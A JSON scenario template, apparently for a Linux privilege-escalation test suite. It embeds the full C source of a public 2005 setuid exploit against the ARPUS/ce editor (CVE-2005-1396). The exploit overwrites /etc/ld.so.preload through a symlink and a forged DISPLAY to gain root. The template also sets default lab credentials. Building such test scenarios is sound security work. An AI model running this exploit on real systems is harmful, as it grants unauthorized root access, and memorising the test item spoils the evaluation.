@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_973",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: ARPUS/Ce - Local File Overwrite (setuid) (OSVDB-16050;CVE-2005-1396)\n\nExploit source code (973.c):\n```\n/*\n* Copyright Kevin Finisterre - ripped from my perl_ex.c\n*\n* ** DISCLAIMER ** I am in no way responsible for your stupidity.\n* ** DISCLAIMER ** I am in no way liable for any damages caused by compilation and or execution of this code.\n*\n* ** WARNING ** DO NOT RUN THIS UNLESS YOU KNOW WHAT YOU ARE DOING ***\n* ** WARNING ** overwriting /etc/ld.so.preload can severly fuck up your box (or someone elses).\n* ** WARNING ** have a boot disk ready incase some thing goes wrong.\n*\n* Setuid ARPUS/ce exploit by KF - kf_lists[at]digitalmunition[dot]com - 4/21/05\n*\n* kfinisterre@kfinisterre01:~$ ls -al /usr/bin/ce\n* -rwsr-xr-x  1 root bin 630010 Sep 27  2004 /usr/bin/ce\n*\n* Tested against http://168.158.26.15/ce/ce-0260-intel-pentium-linux-fedoracore3.tar.gz\n*  and ce-0254-intel-pentium-linux-redhat73.tar.Z\n*\n* (16:34:04) kfin80: this program is tricky\n* (16:34:14) kfin80: it drops privs under certain conditions\n* (16:34:20) kfin80: it was fucking me up for a second. =]\n* (16:36:02) kfin80: kfinisterre@kfinisterre01:~$ ce a a\n* (16:36:13) kfin80: kfinisterre@kfinisterre01:~$ ls -al /tmp/ce_edit_log\n* -rwxrwxrwx  1 kfinisterre kfinisterre 6594 Apr 21 16:35 /tmp/ce_edit_log\n* (16:36:16) kfin80: owned by ME\n* (16:36:36) kfin80: kfinisterre@kfinisterre01:~$ export DISPLAY=yamom\n* kfinisterre@kfinisterre01:~$ rm /tmp/ce_edit_log\n* kfinisterre@kfinisterre01:~$ ce a a\n* ce: cannot connect to X server yamom (Success)\n* kfinisterre@kfinisterre01:~$ ls -al /tmp/ce_edit_log\n* -rwxrwxrwx  1 root kfinisterre 107 Apr 21 16:36 /tmp/ce_edit_log\n* (16:36:38) d4yj4y: hmmmmmm\n* (16:36:38) kfin80: owned by root\n* (16:36:49) kfin80: the export of a faulty display makes it NOT drop privs.\n*\n*/\n\n#define PRELOAD \"/etc/ld.so.preload\"\n#include <stdio.h>\n#include <strings.h>\n\nint main(int *argc, char **argv)\n{\n\n       FILE *getuid;\n       if(!(getuid = fopen(\"/tmp/getuid.c\",\"w+\"))) {\n               printf(\"error opening file\\n\");\n               exit(1);\n       }\n\n       fprintf(getuid, \"int getuid(){return 0;}\\n\" );\n       fclose(getuid);\n\n       system(\"cc -fPIC -Wall -g -O2 -shared -o /tmp/getuid.so /tmp/getuid.c -lc\");\n\n       symlink(PRELOAD,\"/tmp/ce_edit_log\");\n       umask(001); // I'm rw-rw-rw james bitch!\n\n       putenv(\"DISPLAY=dmr0x!\");  // GIMME ROOT BITCH!\n       system(\"/usr/bin/ce\");\n       FILE *ld_so_preload;\n\n       char preload[] = {\n               \"/tmp/getuid.so\\n\"\n       };\n\n       if(!(ld_so_preload = fopen(PRELOAD,\"w+\"))) {\n               printf(\"error opening file\\n\");\n               exit(1);\n       }\n       fwrite(preload,sizeof(preload)-1,1,ld_so_preload);\n       fclose(ld_so_preload);\n}\n\n// milw0rm.com [2005-05-01]\n```",
+  "cve": "OSVDB-16050;CVE-2005-1396",
+  "exploitdb_id": "973",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_973",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
